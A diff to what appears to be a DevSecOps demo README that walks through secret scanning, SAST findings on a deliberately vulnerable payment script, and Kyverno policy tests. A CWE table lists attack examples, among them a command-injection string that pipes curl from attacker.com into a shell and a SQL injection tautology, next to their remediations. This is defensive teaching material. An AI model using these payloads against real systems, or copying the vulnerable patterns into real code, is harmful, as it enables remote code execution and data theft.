@@ -777,6 +777,157 @@ kubectl exec -n payments-dev \
 
 ---
 
+#### F. Hardcoded secret caught before the image is built (Trivy + GitHub Push Protection)
+
+`demo/insecure-code/vulnerable_payment.py` contains five real vulnerability classes.
+This scenario has two defence layers — and both fired during the development of this repo.
+
+**Defence layer 1 — GitHub Push Protection (caught at `git push`):**
+
+When this repo was built, the commit containing a real-format Stripe key (`sk_live_...`)
+was blocked by GitHub Push Protection before it reached the remote:
+
+```
+remote: — GITHUB PUSH PROTECTION
+remote:   Push cannot contain secrets
+remote:   —— Stripe API Key ——
+remote:     path: demo/insecure-code/vulnerable_payment.py
+```
+
+The attacker's key never reaches the repository. The block happens at the developer's
+machine — before CI, before the registry, before any other system sees it.
+
+**Defence layer 2 — Trivy secret scan (caught in CI and locally):**
+
+```bash
+# Scan the vulnerable file locally — catches the hardcoded pattern:
+trivy fs --scanners secret demo/insecure-code/vulnerable_payment.py
+# Expected: CRITICAL — hardcoded credential detected in PAYMENT_GATEWAY_KEY
+```
+
+```bash
+# Positive — secure version has nothing to find:
+trivy fs --scanners secret demo/insecure-code/secure_payment.py
+# Expected: 0 findings — credential is in os.environ[], not in code
+```
+
+Open both files side-by-side. The secure version uses `os.environ["PAYMENT_GATEWAY_KEY"]`
+— the value is injected at runtime from a K8s Secret, never in source control.
+
+> *"Two independent layers caught this. GitHub Push Protection blocked the commit at the
+> terminal before it reached the remote — the repo never contained the key. Trivy secret
+> scanning in CI is the second gate for anything that slips through. This is exactly
+> what happened when building this PoC — I can show you the rejection message. The
+> credential was caught at the keyboard, not in a breach post-mortem."*
+
+---
+
+#### G. Dangerous functions caught by SAST (CodeQL + Snyk)
+
+Open `demo/insecure-code/vulnerable_payment.py`. Five CWEs annotated with the attack scenario
+and which tool catches it — these appear as inline PR annotations in the GitHub Security tab:
+
+| Function | CWE | Attack scenario | Caught by |
+|---|---|---|---|
+| `PAYMENT_GATEWAY_KEY = "sk_live_..."` | CWE-798 | Key in git history + CI logs | Trivy secret scan |
+| `f"SELECT ... WHERE user_id = '{user_id}'"` | CWE-89 SQL injection | `' OR '1'='1'` dumps all card data | CodeQL, Snyk |
+| `os.system(f"generate_report.sh {report_name}")` | CWE-78 Command injection | `report; curl attacker.com \| sh` | CodeQL, Snyk |
+| `hashlib.md5(card_number.encode())` | CWE-327 Broken crypto | MD5 collisions — PCI-DSS Req 3.4 failure | Snyk DeepCode |
+| `pickle.loads(session_blob)` | CWE-502 Unsafe deserialisation | Craft payload → arbitrary code execution on load | Snyk, CodeQL |
+
+Now open `demo/insecure-code/secure_payment.py` and walk through the remediations:
+
+```python
+# CWE-89 fix: parameterised query — user input is never in the SQL string
+cursor.execute("SELECT card_number, amount FROM payments WHERE user_id = ?", (user_id,))
+
+# CWE-78 fix: allowlist regex + subprocess list args — no shell involved
+if not re.fullmatch(r"[a-z0-9_-]{1,64}", report_name): raise ValueError(...)
+subprocess.run(["generate_report.sh", report_name], shell=False)
+
+# CWE-327 fix: PBKDF2-HMAC-SHA256 with 32-byte random salt + 600,000 iterations
+salt = secrets.token_bytes(32)
+dk = hashlib.pbkdf2_hmac("sha256", card_number.encode(), salt, 600_000)
+
+# CWE-502 fix: JSON has no code execution surface + schema key validation
+session = json.loads(session_blob)
+required_keys = {"user_id", "expires_at", "cart_total_pence"}
+if not required_keys.issubset(session): raise ValueError(...)
+```
+
+> *"SAST catches these before the first line runs in any environment. The developer sees
+> the annotation on their PR diff — SQL injection on line 23 — with the fix suggestion
+> inline. That's shift-left in practice: the cost to fix a SQLi pre-merge is minutes;
+> post-breach it's months and a PCI-DSS QSA. CodeQL traces full data flow — it follows
+> the taint from the function argument to cursor.execute(), which is why it has lower
+> false positives than grep-based tools. The payments context makes CWE-89 and CWE-327
+> particularly critical — card data in plaintext or under broken crypto is a Req 3 breach."*
+
+---
+
+#### H. Kyverno policy unit tests (no cluster required)
+
+A policy with a syntax error that silently passes everything is as dangerous as no policy.
+This PoC unit-tests all admission policies before deploying them — same discipline as
+application code.
+
+```bash
+make kyverno-test
+# or: kyverno test kyverno/
+```
+
+Expected output:
+```
+Loading test  ( kyverno/tests/unit-test.yaml ) ...
+
+  good-pod            require-non-root         check-runasnonroot  PASS
+  bad-pod-root        require-non-root         check-runasnonroot  FAIL ✓
+  good-pod            require-resource-limits  check-limits        PASS
+  bad-pod-no-limits   require-resource-limits  check-limits        FAIL ✓
+  good-pod            block-privileged-containers  no-privileged   PASS
+  bad-pod-privileged  block-privileged-containers  no-privileged   FAIL ✓
+
+Test Summary: 6 test(s) passed.
+```
+
+Open `kyverno/tests/unit-test.yaml` — each `result` entry explicitly asserts whether
+the policy rule should PASS or FAIL for a given pod in `kyverno/tests/resources.yaml`.
+If a policy change breaks the logic, the test suite catches it before cluster deployment.
+
+> *"Kyverno policies are code. Code has tests. If I change the non-root policy and it
+> accidentally starts passing root pods, the test suite catches it immediately — no
+> cluster needed, no incident post-deploy. It runs in CI in seconds."*
+
+---
+
+#### One-stop security demo: `make security-scan`
+
+Show the full scanning stack in a single command — no cluster required:
+
+```bash
+make security-scan
+```
+
+Five checks run in sequence:
+1. **Secrets in source** — Trivy secret scan across all source files
+2. **IaC misconfigs** — Trivy checks Terraform + K8s manifests for misconfigurations
+3. **Production image** — Trivy confirms the hardened image has 0 CRITICAL/HIGH CVEs
+4. **Vulnerable comparison** — builds `demo/vulnerable/Dockerfile` and shows the CVE delta
+5. **SBOM CVE query** — syft generates SBOM, grype queries it without rebuilding
+
+```bash
+# Demonstrate RBAC least-privilege (requires a running cluster):
+make rbac-audit
+# Shows: nginx-app SA cannot create pods, read secrets, or list deployments
+#        ArgoCD SA can patch Deployments but cannot delete or read Secrets
+
+# After CI has run on master — prove the supply chain signature is real:
+make verify-supply-chain
+# Output: { subject, issuer, workflow } — confirms the image came from your pipeline
+```
+
+---
+
 ## JD mapping
 
 Every JD requirement maps to specific files in this repo. Open the file directly to show evidence.
@@ -804,6 +955,11 @@ Every JD requirement maps to specific files in this repo. Open the file directly
 | DAST | Step 14 | `.github/workflows/dast.yaml`, `.zap/rules.tsv` (rule overrides with rationale) |
 | Automated dependency updates | — | `.github/dependabot.yml` (weekly PRs: Actions + Docker + pip + Terraform + npm) |
 | Vulnerability disclosure | — | `SECURITY.md` (private disclosure via GitHub Security Advisories) |
+| SAST — dangerous functions / insecure code | Steps 5, 16G | `demo/insecure-code/vulnerable_payment.py` (CWE-89/78/327/502/798 annotated), `demo/insecure-code/secure_payment.py` (remediations), `.github/workflows/ci.yaml` — `codeql` job |
+| Secret detection in source | Step 16F | `demo/insecure-code/vulnerable_payment.py` (hardcoded key), `make security-scan` — Trivy FS secret scan |
+| Policy unit testing | Step 16H | `kyverno/tests/unit-test.yaml`, `kyverno/tests/resources.yaml`, `make kyverno-test` |
+| RBAC least-privilege audit | — | `k8s/rbac/rbac.yaml`, `make rbac-audit` (`kubectl auth can-i` for each service account) |
+| Supply chain signature verification | Step 12, 16B | `make verify-supply-chain` (cosign verify + jq proof), `kyverno/policies/verify-images.yaml` |
 
 ## Note on scope
 
